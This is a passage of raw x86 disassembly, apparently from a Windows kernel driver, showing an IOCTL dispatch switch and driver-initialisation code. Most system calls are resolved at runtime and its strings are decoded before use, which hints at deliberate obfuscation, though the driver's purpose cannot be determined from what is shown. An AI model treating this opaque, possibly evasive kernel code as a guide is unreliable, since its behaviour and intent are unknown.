   18bc8:	mov    DWORD PTR [ebp-0x54],ecx
   18bcb:	mov    ecx,DWORD PTR [esi+0x1c]
   18bce:	mov    DWORD PTR [ebp-0x50],ecx
   18bd1:	mov    ecx,DWORD PTR [esi+0x20]
   18bd4:	mov    DWORD PTR [ebp-0x4c],ecx
   18bd7:	mov    ecx,DWORD PTR [esi+0x24]
   18bda:	mov    DWORD PTR [ebp-0x48],ecx
   18bdd:	mov    ecx,DWORD PTR [esi+0x10]
   18be0:	lea    edx,[ebp-0x4c]
   18be3:	push   edx
   18be4:	lea    edx,[ebp-0x54]
   18be7:	push   edx
   18be8:	push   ecx
   18be9:	push   eax
   18bea:	lea    eax,[ebp-0x5c]
   18bed:	push   eax
   18bee:	lea    eax,[ebp-0x24]
   18bf1:	push   eax
   18bf2:	lea    eax,[ebp-0x2c]
   18bf5:	push   eax
   18bf6:	lea    eax,[ebp-0x34]
   18bf9:	push   eax
   18bfa:	push   DWORD PTR [ebp-0x1c]
   18bfd:	lea    eax,[ebp-0x3c]
   18c00:	push   eax
   18c01:	lea    eax,[ebp-0x44]
   18c04:	push   eax
   18c05:	push   DWORD PTR [esi+0x4]
   18c08:	call   0x18966
   18c0d:	xor    ecx,ecx
   18c0f:	test   al,al
   18c11:	sete   cl
   18c14:	mov    DWORD PTR [esi+0x8],ecx
   18c17:	push   DWORD PTR [ebp-0x5c]
   18c1a:	call   0x10a9a
   18c1f:	push   DWORD PTR [ebp-0x24]
   18c22:	call   0x10a9a
   18c27:	push   DWORD PTR [ebp-0x2c]
   18c2a:	call   0x10a9a
   18c2f:	push   DWORD PTR [ebp-0x34]
   18c32:	call   0x10a9a
   18c37:	push   DWORD PTR [ebp-0x3c]
   18c3a:	call   0x10a9a
   18c3f:	push   DWORD PTR [ebp-0x44]
   18c42:	call   0x10a9a
   18c47:	add    esp,0x18
   18c4a:	jmp    0x18c5d
   18c4c:	xor    eax,eax
   18c4e:	inc    eax
   18c4f:	ret    
   18c50:	mov    esp,DWORD PTR [ebp-0x18]
   18c53:	mov    eax,DWORD PTR [ebp+0x8]
   18c56:	mov    DWORD PTR [eax+0x8],0x4
   18c5d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   18c64:	push   0x0
   18c66:	push   0x7eb70
   18c6b:	call   DWORD PTR ds:0x1f024
   18c71:	call   0x1db61
   18c76:	ret    0x4
   18c79:	int3   
   18c7a:	int3   
   18c7b:	int3   
   18c7c:	int3   
   18c7d:	int3   
   18c7e:	push   0x2c
   18c80:	push   0x7e048
   18c85:	call   0x1db1c
   18c8a:	xor    edi,edi
   18c8c:	mov    DWORD PTR [ebp-0x24],edi
   18c8f:	mov    ebx,DWORD PTR [ebp+0xc]
   18c92:	mov    DWORD PTR [ebx+0x18],edi
   18c95:	mov    DWORD PTR [ebx+0x1c],edi
   18c98:	mov    eax,DWORD PTR [ebx+0x60]
   18c9b:	cmp    BYTE PTR [eax],0xe
   18c9e:	jne    0x1913e
   18ca4:	mov    eax,DWORD PTR [eax+0xc]
   18ca7:	mov    DWORD PTR [ebx+0x1c],0x84c
   18cae:	mov    ecx,0x22c068
   18cb3:	cmp    eax,ecx
   18cb5:	ja     0x18fef
   18cbb:	je     0x18fe0
   18cc1:	add    ecx,0xffffffd0
   18cc4:	cmp    eax,ecx
   18cc6:	ja     0x18de3
   18ccc:	je     0x18dca
   18cd2:	sub    eax,0x22c020
   18cd7:	je     0x18d94
   18cdd:	push   0x4
   18cdf:	pop    esi
   18ce0:	sub    eax,esi
   18ce2:	je     0x18d5e
   18ce4:	sub    eax,esi
   18ce6:	je     0x18d43
   18ce8:	sub    eax,esi
   18cea:	je     0x18d36
   18cec:	sub    eax,esi
   18cee:	je     0x18d05
   18cf0:	sub    eax,esi
   18cf2:	jne    0x190de
   18cf8:	push   DWORD PTR [ebx+0xc]
   18cfb:	call   0x17998
   18d00:	jmp    0x1913b
   18d05:	mov    esi,DWORD PTR [ebx+0xc]
   18d08:	mov    eax,DWORD PTR [esi]
   18d0a:	add    eax,0x28
   18d0d:	mov    DWORD PTR [ebx+0x1c],eax
   18d10:	push   0xffffffff
   18d12:	lea    eax,[esi+0x28]
   18d15:	push   eax
   18d16:	lea    ecx,[ebp-0x34]
   18d19:	call   0x110ae
   18d1e:	push   esi
   18d1f:	lea    eax,[ebp-0x34]
   18d22:	push   eax
   18d23:	call   0x1684a
   18d28:	push   DWORD PTR [ebp-0x34]
   18d2b:	call   0x10a9a
   18d30:	pop    ecx
   18d31:	jmp    0x1913e
   18d36:	push   DWORD PTR [ebx+0xc]
   18d39:	call   0x18b0c
   18d3e:	jmp    0x1913b
   18d43:	mov    ecx,DWORD PTR ds:0x7ecf8
   18d49:	call   0x16b28
   18d4e:	mov    ecx,DWORD PTR ds:0x7ebcc
   18d54:	call   0x16be4
   18d59:	jmp    0x1913e
   18d5e:	mov    eax,DWORD PTR [ebx+0xc]
   18d61:	mov    DWORD PTR [ebx+0x1c],0x10
   18d68:	mov    ecx,DWORD PTR [eax]
   18d6a:	cmp    ecx,edi
   18d6c:	jl     0x1913e
   18d72:	cmp    ecx,0x6
   18d75:	jge    0x1913e
   18d7b:	mov    edx,DWORD PTR [eax+0x8]
   18d7e:	mov    DWORD PTR [ecx*8+0x7ed48],edx
   18d85:	mov    eax,DWORD PTR [eax+0xc]
   18d88:	mov    DWORD PTR [ecx*8+0x7ed4c],eax
   18d8f:	jmp    0x1913e
   18d94:	mov    eax,DWORD PTR [ebx+0xc]
   18d97:	mov    DWORD PTR [ebx+0x1c],0x10
   18d9e:	mov    ecx,DWORD PTR [eax]
   18da0:	cmp    ecx,edi
   18da2:	jl     0x1913e
   18da8:	cmp    ecx,0x6
   18dab:	jge    0x1913e
   18db1:	mov    edx,DWORD PTR [ecx*8+0x7ed48]
   18db8:	mov    DWORD PTR [eax+0x8],edx
   18dbb:	mov    ecx,DWORD PTR [ecx*8+0x7ed4c]
   18dc2:	mov    DWORD PTR [eax+0xc],ecx
   18dc5:	jmp    0x1913e
   18dca:	mov    eax,DWORD PTR [ebx+0xc]
   18dcd:	mov    ecx,DWORD PTR [eax]
   18dcf:	add    ecx,0xc
   18dd2:	mov    DWORD PTR [ebx+0x1c],ecx
   18dd5:	push   eax
   18dd6:	push   DWORD PTR [eax+0x4]
   18dd9:	call   0x15fba
   18dde:	jmp    0x1913e
   18de3:	sub    eax,0x22c03c
   18de8:	je     0x18f5c
   18dee:	sub    eax,0x10
   18df1:	je     0x18f52
   18df7:	push   0x4
   18df9:	pop    esi
   18dfa:	sub    eax,esi
   18dfc:	je     0x18e52
   18dfe:	sub    eax,0xc
   18e01:	je     0x18e3a
   18e03:	sub    eax,esi
   18e05:	je     0x18e1c
   18e07:	sub    eax,esi
   18e09:	jne    0x190de
   18e0f:	push   DWORD PTR [ebx+0xc]
   18e12:	call   0x1287a
   18e17:	jmp    0x1913b
   18e1c:	mov    DWORD PTR [ebx+0x1c],0x8
   18e23:	mov    ebx,DWORD PTR [ebx+0xc]
   18e26:	mov    eax,ds:0x7ed2c
   18e2b:	mov    DWORD PTR [ebx],eax
   18e2d:	mov    eax,ds:0x7ed30
   18e32:	mov    DWORD PTR [ebx+0x4],eax
   18e35:	jmp    0x1913e
   18e3a:	mov    eax,DWORD PTR [ebx+0xc]
   18e3d:	mov    ecx,DWORD PTR [eax]
   18e3f:	mov    DWORD PTR ds:0x7ed2c,ecx
   18e45:	mov    eax,DWORD PTR [eax+0x4]
   18e48:	mov    ds:0x7ed30,eax
   18e4d:	jmp    0x1913b
   18e52:	mov    DWORD PTR [ebx+0x1c],edi
   18e55:	mov    esi,DWORD PTR [ebx+0xc]
   18e58:	mov    DWORD PTR [ebp-0x20],esi
   18e5b:	push   0xffffffff
   18e5d:	push   0x1df30
   18e62:	lea    ecx,[ebp-0x2c]
   18e65:	call   0x110ae
   18e6a:	xor    edi,edi
   18e6c:	inc    edi
   18e6d:	mov    DWORD PTR [esi+0x8],edi
   18e70:	xor    eax,eax
   18e72:	push   eax
   18e73:	push   eax
   18e74:	push   eax
   18e75:	push   eax
   18e76:	push   0x7eb70
   18e7b:	call   DWORD PTR ds:0x1f028
   18e81:	test   eax,eax
   18e83:	jge    0x18e8d
   18e85:	push   DWORD PTR [ebp-0x2c]
   18e88:	jmp    0x18d2b
   18e8d:	and    DWORD PTR [ebp-0x4],0x0
   18e91:	mov    DWORD PTR [ebp-0x4],edi
   18e94:	mov    eax,DWORD PTR [esi]
   18e96:	add    eax,0x28
   18e99:	mov    DWORD PTR [ebx+0x1c],eax
   18e9c:	mov    eax,ds:0x7ecf8
   18ea1:	mov    ebx,DWORD PTR [eax+0x4]
   18ea4:	mov    eax,DWORD PTR [ebx]
   18ea6:	mov    DWORD PTR [ebp+0xc],eax
   18ea9:	and    DWORD PTR [ebp-0x1c],0x0
   18ead:	mov    edi,DWORD PTR [esi+0x28]
   18eb0:	cmp    DWORD PTR [ebp-0x1c],edi
   18eb3:	jge    0x18ec7
   18eb5:	cmp    DWORD PTR [ebp+0xc],ebx
   18eb8:	je     0x18ec7
   18eba:	lea    ecx,[ebp+0xc]
   18ebd:	call   0x1387e
   18ec2:	inc    DWORD PTR [ebp-0x1c]
   18ec5:	jmp    0x18eb0
   18ec7:	mov    eax,DWORD PTR [ebp+0xc]
   18eca:	cmp    eax,ebx
   18ecc:	je     0x18ee0
   18ece:	and    DWORD PTR [esi+0x8],0x0
   18ed2:	add    eax,0x10
   18ed5:	push   eax
   18ed6:	lea    ecx,[ebp-0x2c]
   18ed9:	call   0x129cc
   18ede:	jmp    0x18ee7
   18ee0:	mov    DWORD PTR [esi+0x8],0x1
   18ee7:	and    DWORD PTR [esi+0x4],0x0
   18eeb:	and    DWORD PTR [ebp-0x4],0x0
   18eef:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   18ef6:	call   0x18f44
   18efb:	cmp    DWORD PTR [esi+0x8],0x0
   18eff:	jne    0x18e85
   18f01:	push   esi
   18f02:	lea    eax,[ebp-0x2c]
   18f05:	push   eax
   18f06:	call   0x1684a
   18f0b:	jmp    0x18e85
   18f10:	xor    eax,eax
   18f12:	inc    eax
   18f13:	ret    
   18f14:	mov    esp,DWORD PTR [ebp-0x18]
   18f17:	mov    eax,DWORD PTR [ebp-0x20]
   18f1a:	mov    DWORD PTR [eax+0x8],0x4
   18f21:	push   DWORD PTR [ebp-0x2c]
   18f24:	call   0x10a9a
   18f29:	push   0xfffffffe
   18f2b:	lea    eax,[ebp-0x10]
   18f2e:	push   eax
   18f2f:	push   0x7eb38
   18f34:	call   0x1dcdc
   18f39:	add    esp,0x10
   18f3c:	jmp    0x1913e
   18f41:	mov    esi,DWORD PTR [ebp-0x20]
   18f44:	push   0x0
   18f46:	push   0x7eb70
   18f4b:	call   DWORD PTR ds:0x1f024
   18f51:	ret    
   18f52:	call   0x123a4
   18f57:	jmp    0x1913e
   18f5c:	mov    eax,DWORD PTR [ebx+0xc]
   18f5f:	mov    ecx,DWORD PTR ds:0x7e204
   18f65:	mov    esi,eax
   18f67:	sub    esi,ecx
   18f69:	push   0x2
   18f6b:	pop    edi
   18f6c:	movzx  edx,WORD PTR [ecx]
   18f6f:	mov    WORD PTR [esi+ecx*1],dx
   18f73:	add    ecx,edi
   18f75:	test   dx,dx
   18f78:	jne    0x18f6c
   18f7a:	mov    ecx,0x7e248
   18f7f:	lea    esi,[eax+0x50]
   18f82:	sub    esi,ecx
   18f84:	movzx  edx,WORD PTR [ecx]
   18f87:	mov    WORD PTR [esi+ecx*1],dx
   18f8b:	add    ecx,edi
   18f8d:	test   dx,dx
   18f90:	jne    0x18f84
   18f92:	mov    ecx,0x7e208
   18f97:	lea    esi,[eax+0x90]
   18f9d:	sub    esi,ecx
   18f9f:	movzx  edx,WORD PTR [ecx]
   18fa2:	mov    WORD PTR [esi+ecx*1],dx
   18fa6:	add    ecx,edi
   18fa8:	test   dx,dx
   18fab:	jne    0x18f9f
   18fad:	mov    ecx,0x7e288
   18fb2:	lea    esi,[eax+0xd0]
   18fb8:	sub    esi,ecx
   18fba:	movzx  edx,WORD PTR [ecx]
   18fbd:	mov    WORD PTR [esi+ecx*1],dx
   18fc1:	add    ecx,edi
   18fc3:	test   dx,dx
   18fc6:	jne    0x18fba
   18fc8:	lea    edi,[eax+0x40]
   18fcb:	mov    esi,0x7a2ec
   18fd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18fd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18fd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18fd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18fd4:	mov    DWORD PTR [ebx+0x1c],0x110
   18fdb:	jmp    0x1913e
   18fe0:	mov    eax,DWORD PTR [ebx+0xc]
   18fe3:	push   DWORD PTR [eax]
   18fe5:	call   0x10ff6
   18fea:	jmp    0x1913b
   18fef:	mov    ecx,0x22c088
   18ff4:	cmp    eax,ecx
   18ff6:	ja     0x190c0
   18ffc:	je     0x19095
   19002:	sub    eax,0x22c06c
   19007:	je     0x1907d
   19009:	push   0x4
   1900b:	pop    esi
   1900c:	sub    eax,esi
   1900e:	je     0x19070
   19010:	push   0x8
   19012:	pop    ecx
   19013:	sub    eax,ecx
   19015:	je     0x19063
   19017:	sub    eax,esi
   19019:	je     0x1904b
   1901b:	sub    eax,esi
   1901d:	je     0x19034
   1901f:	sub    eax,esi
   19021:	jne    0x190de
   19027:	push   DWORD PTR [ebx+0xc]
   1902a:	call   0x178a2
   1902f:	jmp    0x1913b
   19034:	mov    DWORD PTR [ebx+0x1c],ecx
   19037:	mov    ebx,DWORD PTR [ebx+0xc]
   1903a:	mov    eax,ds:0x7ed34
   1903f:	mov    DWORD PTR [ebx],eax
   19041:	mov    eax,ds:0x7ed38
   19046:	jmp    0x18e32
   1904b:	mov    eax,DWORD PTR [ebx+0xc]
   1904e:	mov    ecx,DWORD PTR [eax]
   19050:	mov    DWORD PTR ds:0x7ed34,ecx
   19056:	mov    eax,DWORD PTR [eax+0x4]
   19059:	mov    ds:0x7ed38,eax
   1905e:	jmp    0x1913b
   19063:	push   DWORD PTR [ebx+0xc]
   19066:	call   0x170b6
   1906b:	jmp    0x1913b
   19070:	push   DWORD PTR [ebx+0xc]
   19073:	call   0x10f66
   19078:	jmp    0x1913b
   1907d:	mov    esi,DWORD PTR [ebx+0xc]
   19080:	push   DWORD PTR [esi]
   19082:	call   0x1103a
   19087:	mov    DWORD PTR [esi],eax
   19089:	mov    DWORD PTR [ebx+0x1c],0x4
   19090:	jmp    0x1913e
   19095:	mov    esi,DWORD PTR [ebx+0xc]
   19098:	mov    eax,DWORD PTR [esi]
   1909a:	add    eax,0xc
   1909d:	mov    DWORD PTR [ebx+0x1c],eax
   190a0:	push   0xffffffff
   190a2:	lea    eax,[esi+0xc]
   190a5:	push   eax
   190a6:	lea    ecx,[ebp-0x3c]
   190a9:	call   0x110ae
   190ae:	push   esi
   190af:	lea    eax,[ebp-0x3c]
   190b2:	push   eax
   190b3:	call   0x15ed0
   190b8:	push   DWORD PTR [ebp-0x3c]
   190bb:	jmp    0x18d2b
   190c0:	sub    eax,0x22c08c
   190c5:	je     0x1912d
   190c7:	push   0x4
   190c9:	pop    esi
   190ca:	sub    eax,esi
   190cc:	je     0x19119
   190ce:	sub    eax,esi
   190d0:	je     0x19112
   190d2:	sub    eax,esi
   190d4:	je     0x190fe
   190d6:	sub    eax,esi
   190d8:	je     0x190f4
   190da:	sub    eax,esi
   190dc:	je     0x190e7
   190de:	mov    DWORD PTR [ebp-0x24],0xc0000010
   190e5:	jmp    0x1913b
   190e7:	push   DWORD PTR [ebx+0xc]
   190ea:	call   0x1aad0
   190ef:	mov    DWORD PTR [ebx+0x1c],esi
   190f2:	jmp    0x1913e
   190f4:	push   DWORD PTR [ebx+0xc]
   190f7:	call   0x1b556
   190fc:	jmp    0x1913b
   190fe:	mov    eax,DWORD PTR [ebx+0xc]
   19101:	mov    ecx,DWORD PTR [eax+0x4]
   19104:	add    ecx,0x8
   19107:	mov    DWORD PTR [ebx+0x1c],ecx
   1910a:	push   eax
   1910b:	call   0x1b824
   19110:	jmp    0x1913e
   19112:	call   0x1b466
   19117:	jmp    0x1913b
   19119:	mov    eax,DWORD PTR [ebx+0xc]
   1911c:	mov    ecx,DWORD PTR [eax+0x4]
   1911f:	add    ecx,0x8
   19122:	mov    DWORD PTR [ebx+0x1c],ecx
   19125:	push   eax
   19126:	call   0x1a8b0
   1912b:	jmp    0x1913e
   1912d:	push   DWORD PTR [ebx+0xc]
   19130:	call   0x11082
   19135:	push   eax
   19136:	call   0x1b688
   1913b:	mov    DWORD PTR [ebx+0x1c],edi
   1913e:	mov    eax,DWORD PTR [ebp-0x24]
   19141:	call   0x1db61
   19146:	ret    0x8
   19149:	int3   
   1914a:	int3   
   1914b:	int3   
   1914c:	int3   
   1914d:	int3   
   1914e:	push   0xc
   19150:	push   0x7e070
   19155:	call   0x1db1c
   1915a:	and    DWORD PTR [ebp-0x4],0x0
   1915e:	push   DWORD PTR [ebp+0xc]
   19161:	push   DWORD PTR [ebp+0x8]
   19164:	call   0x18c7e
   19169:	mov    esi,eax
   1916b:	jmp    0x19180
   1916d:	xor    eax,eax
   1916f:	inc    eax
   19170:	ret    
   19171:	mov    esp,DWORD PTR [ebp-0x18]
   19174:	push   0xd
   19176:	call   0x10ff6
   1917b:	mov    esi,0xc0000001
   19180:	mov    DWORD PTR [ebp-0x1c],esi
   19183:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1918a:	cmp    esi,0x103
   19190:	je     0x191a0
   19192:	mov    ecx,DWORD PTR [ebp+0xc]
   19195:	mov    DWORD PTR [ecx+0x18],esi
   19198:	xor    dl,dl
   1919a:	call   DWORD PTR ds:0x1f044
   191a0:	mov    eax,esi
   191a2:	call   0x1db61
   191a7:	ret    0x8
   191aa:	int3   
   191ab:	int3   
   191ac:	int3   
   191ad:	int3   
   191ae:	int3   
   191af:	int3   
   191b0:	mov    edi,edi
   191b2:	push   ebp
   191b3:	mov    ebp,esp
   191b5:	push   esi
   191b6:	mov    esi,ecx
   191b8:	mov    BYTE PTR [esi+0x8],0x0
   191bc:	call   0x14b00
   191c1:	lea    ecx,[esi+0x10]
   191c4:	mov    BYTE PTR [ecx+0x8],0x0
   191c8:	call   0x144f0
   191cd:	mov    eax,DWORD PTR [ebp+0x8]
   191d0:	mov    DWORD PTR [esi+0x20],eax
   191d3:	mov    eax,DWORD PTR [ebp+0xc]
   191d6:	mov    DWORD PTR [esi+0x24],eax
   191d9:	mov    eax,esi
   191db:	pop    esi
   191dc:	pop    ebp
   191dd:	ret    0x8
   191e0:	int3   
   191e1:	int3   
   191e2:	int3   
   191e3:	int3   
   191e4:	int3   
   191e5:	int3   
   191e6:	push   0x850
   191eb:	push   0x7e090
   191f0:	call   0x1de20
   191f5:	mov    esi,DWORD PTR [ebp+0x8]
   191f8:	mov    DWORD PTR [ebp-0x828],esi
   191fe:	mov    edi,DWORD PTR [ebp+0xc]
   19201:	call   0x18408
   19206:	call   0x11d04
   1920b:	test   eax,eax
   1920d:	je     0x196eb
   19213:	xor    ebx,ebx
   19215:	mov    DWORD PTR [ebp-0x838],ebx
   1921b:	call   0x1825c
   19220:	cmp    al,bl
   19222:	jne    0x19313
   19228:	mov    DWORD PTR [ebp-0x4],ebx
   1922b:	push   ebx
   1922c:	push   0x19
   1922e:	call   0x109f0
   19233:	cmp    edx,ebx
   19235:	jl     0x1924b
   19237:	jg     0x1923e
   19239:	cmp    eax,0x5
   1923c:	jbe    0x1924b
   1923e:	push   ebx
   1923f:	push   0x7ecd0
   19244:	call   0x11c32
   19249:	call   eax
   1924b:	push   edi
   1924c:	push   0x1ec56
   19251:	lea    eax,[ebp-0x41c]
   19257:	push   eax
   19258:	call   0x1db0e
   1925d:	add    esp,0xc
   19260:	lea    eax,[ebp-0x858]
   19266:	push   eax
   19267:	call   DWORD PTR ds:0x1f04c
   1926d:	push   0x1ec28
   19272:	push   0x4
   19274:	push   0x1ec1e
   19279:	call   0x16c9e
   1927e:	mov    DWORD PTR [ebp-0x82c],eax
   19284:	lea    ecx,[eax+0x2]
   19287:	mov    dx,WORD PTR [eax]
   1928a:	inc    eax
   1928b:	inc    eax
   1928c:	cmp    dx,bx
   1928f:	jne    0x19287
   19291:	sub    eax,ecx
   19293:	sar    eax,1
   19295:	add    eax,eax
   19297:	mov    WORD PTR [ebp-0x82e],ax
   1929e:	mov    WORD PTR [ebp-0x830],ax
   192a5:	mov    DWORD PTR [ebp-0x850],0x18
   192af:	mov    DWORD PTR [ebp-0x84c],ebx
   192b5:	mov    DWORD PTR [ebp-0x844],0x40
   192bf:	lea    eax,[ebp-0x830]
   192c5:	mov    DWORD PTR [ebp-0x848],eax
   192cb:	mov    DWORD PTR [ebp-0x840],ebx
   192d1:	mov    DWORD PTR [ebp-0x83c],ebx
   192d7:	mov    eax,DWORD PTR [ebp-0x82c]
   192dd:	lea    ecx,[eax+0x2]
   192e0:	mov    dx,WORD PTR [eax]
   192e3:	inc    eax
   192e4:	inc    eax
   192e5:	cmp    dx,bx
   192e8:	jne    0x192e0
   192ea:	sub    eax,ecx
   192ec:	sar    eax,1
   192ee:	mov    DWORD PTR [ebp-0x838],eax
   192f4:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   192fb:	jmp    0x19313
   192fd:	xor    eax,eax
   192ff:	inc    eax
   19300:	ret    
   19301:	mov    esp,DWORD PTR [ebp-0x18]
   19304:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1930b:	xor    ebx,ebx
   1930d:	mov    esi,DWORD PTR [ebp-0x828]
   19313:	cmp    DWORD PTR [ebp-0x838],ebx
   19319:	jne    0x196eb
   1931f:	xor    eax,eax
   19321:	lea    edi,[ebp-0x840]
   19327:	stos   DWORD PTR es:[edi],eax
   19328:	stos   DWORD PTR es:[edi],eax
   19329:	mov    DWORD PTR [ebp-0x844],0xc
   19333:	mov    DWORD PTR [ebp-0x840],0x2
   1933d:	mov    BYTE PTR [ebp-0x83c],bl
   19343:	mov    BYTE PTR [ebp-0x83b],bl
   19349:	push   0x7eb90
   1934e:	push   ebx
   1934f:	lea    eax,[ebp-0x844]
   19355:	push   eax
   19356:	call   0x11cda
   1935b:	call   eax
   1935d:	push   eax
   1935e:	call   0x11bb4
   19363:	call   eax
   19365:	push   0x10
   19367:	call   0x10a66
   1936c:	pop    ecx
   1936d:	cmp    eax,ebx
   1936f:	je     0x1938d
   19371:	lea    ecx,[ebp-0x81d]
   19377:	push   ecx
   19378:	lea    ecx,[ebp-0x81d]
   1937e:	push   ecx
   1937f:	mov    ecx,eax
   19381:	call   0x16e8a
   19386:	mov    ds:0x7ecf8,eax
   1938b:	jmp    0x19393
   1938d:	mov    DWORD PTR ds:0x7ecf8,ebx
   19393:	push   0x2c
   19395:	call   0x10a66
   1939a:	pop    ecx
   1939b:	cmp    eax,ebx
   1939d:	je     0x193b4
   1939f:	push   0x5dc
   193a4:	push   0x14
   193a6:	mov    ecx,eax
   193a8:	call   0x186aa
   193ad:	mov    ds:0x7ed00,eax
   193b2:	jmp    0x193ba
   193b4:	mov    DWORD PTR ds:0x7ed00,ebx
   193ba:	push   0x10
   193bc:	call   0x10a66
   193c1:	pop    ecx
   193c2:	cmp    eax,ebx
   193c4:	je     0x193e2
   193c6:	lea    ecx,[ebp-0x81d]
   193cc:	push   ecx
   193cd:	lea    ecx,[ebp-0x81d]
   193d3:	push   ecx
   193d4:	mov    ecx,eax
   193d6:	call   0x16a68
   193db:	mov    ds:0x7eb40,eax
   193e0:	jmp    0x193e8
   193e2:	mov    DWORD PTR ds:0x7eb40,ebx
   193e8:	push   0x10
   193ea:	call   0x10a66
   193ef:	pop    ecx
   193f0:	cmp    eax,ebx
   193f2:	je     0x19410
   193f4:	lea    ecx,[ebp-0x81d]
   193fa:	push   ecx
   193fb:	lea    ecx,[ebp-0x81d]
   19401:	push   ecx
   19402:	mov    ecx,eax
   19404:	call   0x16f4e
   19409:	mov    ds:0x7ebcc,eax
   1940e:	jmp    0x19416
   19410:	mov    DWORD PTR ds:0x7ebcc,ebx
   19416:	push   0x28
   19418:	call   0x10a66
   1941d:	pop    ecx
   1941e:	cmp    eax,ebx
   19420:	je     0x19437
   19422:	push   0x3e8
   19427:	push   0x14
   19429:	mov    ecx,eax
   1942b:	call   0x191b0
   19430:	mov    ds:0x7eb6c,eax
   19435:	jmp    0x1943d
   19437:	mov    DWORD PTR ds:0x7eb6c,ebx
   1943d:	push   0x20
   1943f:	call   0x10a66
   19444:	pop    ecx
   19445:	cmp    eax,ebx
   19447:	je     0x19457
   19449:	mov    ecx,eax
   1944b:	call   0x16c2c
   19450:	mov    ds:0x7eb68,eax
   19455:	jmp    0x1945d
   19457:	mov    DWORD PTR ds:0x7eb68,ebx
   1945d:	call   0x12962
   19462:	call   0x1b5f0
   19467:	call   0x17a48
   1946c:	mov    edi,0x1ec0e
   19471:	push   edi
   19472:	call   0x185ce
   19477:	push   eax
   19478:	push   0x1ebd0
   1947d:	push   0xa
   1947f:	push   0x1ebba
   19484:	call   0x16c9e
   19489:	push   eax
   1948a:	lea    eax,[ebp-0x81c]
   19490:	push   eax
   19491:	call   0x1db02
   19496:	add    esp,0xc
   19499:	lea    eax,[ebp-0x81c]
   1949f:	push   eax
   194a0:	lea    eax,[ebp-0x860]
   194a6:	push   eax
   194a7:	call   0x11c5c
   194ac:	call   eax
   194ae:	push   edi
   194af:	call   0x185ce
   194b4:	push   eax
   194b5:	push   0x1eb82
   194ba:	push   0xe
   194bc:	push   0x1eb64
   194c1:	call   0x16c9e
   194c6:	push   eax
   194c7:	lea    eax,[ebp-0x41c]
   194cd:	push   eax
   194ce:	call   0x1db02
   194d3:	add    esp,0xc
   194d6:	lea    eax,[ebp-0x41c]
   194dc:	push   eax
   194dd:	lea    eax,[ebp-0x858]
   194e3:	push   eax
   194e4:	call   0x11c5c
   194e9:	call   eax
   194eb:	push   0x7ed3c
   194f0:	push   ebx
   194f1:	push   0x100
   194f6:	push   0x22
   194f8:	lea    eax,[ebp-0x860]
   194fe:	push   eax
   194ff:	push   ebx
   19500:	push   esi
   19501:	call   0x11b8a
   19506:	call   eax
   19508:	cmp    eax,ebx
   1950a:	jl     0x196ed
   19510:	mov    eax,0x1914e
   19515:	mov    DWORD PTR [esi+0x94],eax
   1951b:	mov    DWORD PTR [esi+0x90],eax
   19521:	mov    DWORD PTR [esi+0xa4],eax
   19527:	mov    DWORD PTR [esi+0x70],eax
   1952a:	mov    DWORD PTR [esi+0x48],eax
   1952d:	mov    DWORD PTR [esi+0x44],eax
   19530:	mov    DWORD PTR [esi+0x40],eax
   19533:	mov    DWORD PTR [esi+0x38],eax
   19536:	mov    eax,ds:0x7ed3c
   1953b:	or     DWORD PTR [eax+0x1c],0x4
   1953f:	lea    eax,[ebp-0x860]
   19545:	push   eax
   19546:	lea    eax,[ebp-0x858]
   1954c:	push   eax
   1954d:	call   0x11b60
   19552:	call   eax
   19554:	mov    DWORD PTR [ebp-0x828],eax
   1955a:	cmp    eax,ebx
   1955c:	jge    0x19573
   1955e:	push   DWORD PTR [esi+0x4]
   19561:	call   0x11a10
   19566:	call   eax
   19568:	mov    eax,DWORD PTR [ebp-0x828]
   1956e:	jmp    0x196ed
   19573:	push   ebx
   19574:	push   0x7ecd0
   19579:	call   0x11c32
   1957e:	call   eax
   19580:	push   ebx
   19581:	push   0x7eb70
   19586:	call   0x11c32
   1958b:	call   eax
   1958d:	push   ebx
   1958e:	push   0x7eb44
   19593:	call   0x11c32
   19598:	call   eax
   1959a:	push   0x8000000
   1959f:	push   0x1eb28
   195a4:	push   0x9
   195a6:	push   0x1e7c4
   195ab:	call   0x16d94
   195b0:	push   eax
   195b1:	lea    eax,[ebp-0x824]
   195b7:	push   eax
   195b8:	call   0x19b26
   195bd:	push   DWORD PTR [ebp-0x824]
   195c3:	call   0x11896
   195c8:	call   eax
   195ca:	mov    DWORD PTR [ebp-0x834],eax
   195d0:	push   ebx
   195d1:	push   0x1eb06
   195d6:	push   0x16
   195d8:	push   0x1eaee
   195dd:	call   0x16d94
   195e2:	push   eax
   195e3:	push   DWORD PTR [ebp-0x824]
   195e9:	call   0x19a0c
   195ee:	push   eax
   195ef:	push   DWORD PTR [ebp-0x834]
   195f5:	call   0x199b2
   195fa:	mov    edi,eax
   195fc:	add    edi,DWORD PTR [ebp-0x824]
   19602:	mov    esi,0x1df32
   19607:	push   esi
   19608:	call   0x115d6
   1960d:	mov    DWORD PTR [ebp-0x82c],eax
   19613:	push   edi
   19614:	call   0x1995a
   19619:	mov    ecx,DWORD PTR [ebp-0x82c]
   1961f:	mov    ecx,DWORD PTR [ecx]
   19621:	mov    eax,DWORD PTR [ecx+eax*4]
   19624:	mov    ds:0x7ecfc,eax
   19629:	push   ebx
   1962a:	push   0x1eabc
   1962f:	push   0x14
   19631:	push   0x1eaa6
   19636:	call   0x16d94
   1963b:	push   eax
   1963c:	push   DWORD PTR [ebp-0x824]
   19642:	call   0x19a0c
   19647:	push   eax
   19648:	push   DWORD PTR [ebp-0x834]
   1964e:	call   0x199b2
   19653:	mov    edi,eax
   19655:	add    edi,DWORD PTR [ebp-0x824]
   1965b:	push   esi
   1965c:	call   0x115d6
   19661:	mov    DWORD PTR [ebp-0x82c],eax
   19667:	push   edi
   19668:	call   0x1995a
   1966d:	mov    ecx,DWORD PTR [ebp-0x82c]
   19673:	mov    ecx,DWORD PTR [ecx]
   19675:	mov    eax,DWORD PTR [ecx+eax*4]
   19678:	mov    ds:0x7ecf0,eax
   1967d:	push   ebx
   1967e:	push   0x1ea78
   19683:	push   0xe
   19685:	push   0x1ea68
